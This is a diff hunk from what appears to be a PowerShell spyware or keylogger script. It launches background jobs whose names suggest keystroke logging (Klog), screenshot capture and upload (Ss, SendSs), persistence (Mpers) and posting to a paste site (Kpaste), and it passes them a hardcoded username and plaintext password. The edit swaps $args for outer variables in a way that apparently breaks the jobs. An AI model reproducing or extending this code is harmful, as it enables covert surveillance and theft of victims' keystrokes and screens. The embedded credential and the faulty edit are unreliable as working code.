@@ -380,8 +380,8 @@ $functions =  {
 $username = "ryouichi.mikami.hirata"
 $password = "YgP4P*44j^7R4xvwGf4&p!n43eLbqQ"
 
-start-job -InitializationScript $functions -scriptblock {Kpaste $args[0] $args[1]} -ArgumentList @($username,$password)
+start-job -InitializationScript $functions -scriptblock {Kpaste $username $password} -ArgumentList @($username,$password)
 start-job -InitializationScript $functions -scriptblock {Klog}
-start-job -InitializationScript $functions -scriptblock {Mpers $args[0] $args[1]} -ArgumentList @($username,$password)
+start-job -InitializationScript $functions -scriptblock {Mpers $username $password} -ArgumentList @($username,$password)
 start-job -InitializationScript $functions -scriptblock {Ss}
-start-job -InitializationScript $functions -scriptblock {SendSs $args[0] $args[1]} -ArgumentList @($username,$password)
+start-job -InitializationScript $functions -scriptblock {SendSs $username $password} -ArgumentList @($username,$password)
